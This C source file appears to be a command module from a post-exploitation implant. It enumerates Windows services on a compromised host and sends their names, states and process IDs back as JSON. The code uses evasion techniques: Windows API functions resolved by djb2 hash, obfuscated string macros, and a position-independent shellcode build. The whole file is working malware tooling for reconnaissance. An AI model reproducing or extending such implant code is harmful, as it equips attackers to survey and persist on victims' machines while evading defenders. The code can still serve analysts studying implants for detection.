#include "config.h"
#ifdef INCLUDE_CMD_SERVICES

#include "commands.h"
#include "json_out.h"

// void* = void* (avoid conflict with windows.h)
typedef struct _SERVICE_STATUS_PROCESS_A {
    DWORD dwServiceType; DWORD dwCurrentState; DWORD dwControlsAccepted;
    DWORD dwWin32ExitCode; DWORD dwServiceSpecificExitCode; DWORD dwCheckPoint;
    DWORD dwWaitHint; DWORD dwProcessId; DWORD dwServiceFlags;
} SERVICE_STATUS_PROCESS_A;

typedef void* (WINAPI *fn_OpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
typedef void* (WINAPI *fn_OpenServiceA_t)(void*, LPCSTR, DWORD);
typedef BOOL  (WINAPI *fn_EnumServicesStatusExA_t)(void*, DWORD, DWORD, DWORD, BYTE*, DWORD, DWORD*, DWORD*, DWORD*, LPCSTR);
typedef BOOL  (WINAPI *fn_QueryServiceStatusEx_t)(void*, DWORD, BYTE*, DWORD, DWORD*);
typedef BOOL  (WINAPI *fn_CloseServiceHandle_t)(void*);

VOID cmd_services(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_adv, "advapi32.dll");
    HMODULE h_adv = inst->Win32.LoadLibraryA(_adv);
    fn_OpenSCManagerA_t pOpenSCM = h_adv ?
        (fn_OpenSCManagerA_t)resolve_function(h_adv, hash_string_djb2(XSTR("OpenSCManagerA"))) : NULL;
    fn_EnumServicesStatusExA_t pEnum = h_adv ?
        (fn_EnumServicesStatusExA_t)resolve_function(h_adv, hash_string_djb2(XSTR("EnumServicesStatusExA"))) : NULL;
    fn_QueryServiceStatusEx_t pQuery = h_adv ?
        (fn_QueryServiceStatusEx_t)resolve_function(h_adv, hash_string_djb2(XSTR("QueryServiceStatusEx"))) : NULL;
    fn_CloseServiceHandle_t pClose = h_adv ?
        (fn_CloseServiceHandle_t)resolve_function(h_adv, hash_string_djb2(XSTR("CloseServiceHandle"))) : NULL;
    if (!pOpenSCM || !pEnum || !pClose) {
        package_add_string(inst, response, XSTR("advapi32 resolve failed"));
        response->is_error = TRUE;
        return;
    }

    void* scm = pOpenSCM(NULL, NULL, 0x0004 /*SC_MANAGER_ENUMERATE_SERVICE*/);
    if (!scm) {
        package_add_string(inst, response, XSTR("OpenSCManager failed"));
        response->is_error = TRUE;
        return;
    }

    DWORD needed = 0, resumed = 0, count = 0;
    pEnum(scm, 0 /*SC_ENUM_PROCESS_INFO*/, 0x30 /*SERVICE_WIN32*/, 0x3 /*STATE_ALL*/,
          NULL, 0, &needed, &count, NULL, NULL);
    if (needed == 0) { pClose(scm); return; }

    static BYTE* buf = NULL;
    // heap-resident: static arrays embed zero-filled in the PIC blob
    if (!buf) buf = (BYTE*)es_malloc(inst, 524288);
    if (!buf) { pClose(scm); return; }
    if (needed > 524288) needed = 524288;
    DWORD required = needed;   // bound for the name/display pointers; some
                               // enum APIs leave lpBytesNeeded untouched on success
    if (!pEnum(scm, 0, 0x30, 0x3, buf, needed, &needed, &count, &resumed, NULL)) {
        pClose(scm);
        return;
    }
    pClose(scm);

    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"services\":[");

    // ENUM_SERVICE_STATUS_PROCESS (x64): LPSTR lpServiceName (8) +
    // LPSTR lpDisplayName (8) + SERVICE_STATUS_PROCESS (36) = 52 bytes/entry
    // (x86: 4 + 4 + 36 = 44). The name/display members are POINTERS into the
    // buffer returned by EnumServicesStatusExA, not offsets - treating them as
    // offsets both misparses and (pre-guard) crashed the agent.
    DWORD stride = sizeof(void*) + sizeof(void*) + 36;
    for (DWORD i = 0; i < count; i++) {
        BYTE* entry = buf + i * stride;
        char* svc_name  = *(char**)(entry);
        char* svc_disp  = *(char**)(entry + sizeof(void*));
        BYTE* ssp       = entry + 2 * sizeof(void*);
        // sanity: pointers must land inside the returned buffer
        if (!svc_name || !svc_disp ||
            (BYTE*)svc_name < buf || (BYTE*)svc_name >= buf + required ||
            (BYTE*)svc_disp < buf || (BYTE*)svc_disp >= buf + required)
            continue;   // malformed entry - skip rather than fault
        DWORD state     = *(DWORD*)(ssp + 4);
        DWORD pid       = *(DWORD*)(ssp + 28);

        if (i) j_append_raw(&jb, ",");
        j_append_raw(&jb, "{\"name\":");
        j_append_str(&jb, svc_name);
        j_append_raw(&jb, ",\"display\":");
        j_append_str(&jb, svc_disp);
        const char* st = "unknown";
        if (state == 1) st = "stopped"; else if (state == 2) st = "start_pending";
        else if (state == 3) st = "stop_pending"; else if (state == 4) st = "running";
        else if (state == 5) st = "continue_pending"; else if (state == 6) st = "pause_pending";
        else if (state == 7) st = "paused";
        j_append_raw(&jb, ",\"state\":");
        j_append_str(&jb, st);
        j_append_raw(&jb, ",\"pid\":");
        j_append_uint(&jb, pid);
        j_append_raw(&jb, "}");
    }
    j_append_raw(&jb, "],\"count\":");
    j_append_uint(&jb, count);
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
